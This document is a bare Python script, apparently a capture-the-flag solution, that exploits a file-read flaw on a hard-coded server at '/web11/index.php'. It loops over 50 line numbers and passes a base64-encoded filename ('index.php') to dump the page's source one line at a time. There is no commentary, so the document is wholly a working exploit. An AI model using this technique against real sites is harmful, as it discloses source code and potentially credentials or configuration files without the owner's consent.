import requests
for i in range(50):
    print(requests.get("http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&filename=aW5kZXgucGhw").text)
    

